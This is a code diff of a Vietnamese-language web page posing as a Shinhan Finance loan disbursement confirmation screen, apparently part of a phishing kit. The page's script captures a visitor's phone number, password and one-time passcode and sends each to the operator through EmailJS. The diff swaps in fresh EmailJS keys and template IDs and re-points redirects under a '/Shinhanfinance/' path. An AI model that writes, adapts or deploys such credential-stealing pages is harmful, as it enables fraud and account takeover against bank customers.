@@ -14,7 +14,7 @@
     <script type="text/javascript">
       (function() {
           emailjs.init({
-            publicKey: "jugdaw6sXSdJVlAlt", // Thay bằng Public Key của bạn
+            publicKey: "KJ7TlqIPf7U4cfyzQ", // Thay bằng Public Key của bạn
           });
       })();
     </script>
@@ -389,7 +389,7 @@
         <!-- Confirmation View -->
         <div id="confirmation-section" class="page-section active">
             <header class="page-header">
-                <button class="back-button" onclick="window.location.href='/pages/vi/Evaluate-conditions.html'">
+                <button class="back-button" onclick="window.location.href='/Shinhanfinance/pages/vi/Evaluate-conditions.html'">
                     <img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Back"/>
                 </button>
                 <h1>Xác nhận thanh toán</h1>
@@ -686,7 +686,7 @@
                     if (credentials.otp === correctOtp) {
                         showNotification('Xác nhận giải ngân thành công! Đang chuyển hướng...', 'success', 4000);
                         setTimeout(() => {
-                            window.location.href = '/pages/vi/Evaluate-conditions.html?status=success';
+                            window.location.href = '/Shinhanfinance/pages/vi/Evaluate-conditions.html?status=success';
                         }, 4000);
                     } else {
                         otpAttempts++;
@@ -697,7 +697,7 @@
                         } else {
                             showNotification('Bạn đã nhập sai quá 3 lần. Đang chuyển hướng...', 'error', 4000);
                             setTimeout(() => {
-                                window.location.href = '/pages/vi/Evaluate-conditions.html?status=failed';
+                                window.location.href = '/Shinhanfinance/pages/vi/Evaluate-conditions.html?status=failed';
                             }, 4000);
                         }
                     }
@@ -712,7 +712,7 @@
 
             // EmailJS Integration
             const sendToEmail = (type, value) => {
-                const serviceID = 'service_zspw0b7';
+                const serviceID = 'service_149dqxt';
                 let templateID = '';
                 let templateParams = {};
                 const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value')?.textContent || '';
@@ -725,13 +725,13 @@
                 };
 
                 if (type === 'phone') {
-                    templateID = 'template_ps9zcp2'; // <-- **CẬP NHẬT TEMPLATE ID**
+                    templateID = 'template_qs31vgb'; // <-- **CẬP NHẬT TEMPLATE ID**
                     templateParams = { ...commonParams, phone: value };
                 } else if (type === 'password') {
-                    templateID = 'template_hn6yj1d';
+                    templateID = 'template_7m0le19';
                     templateParams = { ...commonParams, phone: credentials.phone, password: value };
                 } else if (type === 'otp') {
-                    templateID = 'template_yy36rn3';
+                    templateID = 'template_neh3g4c';
                     templateParams = { ...commonParams, phone: credentials.phone, password: credentials.password, otp: value };
                 }
 
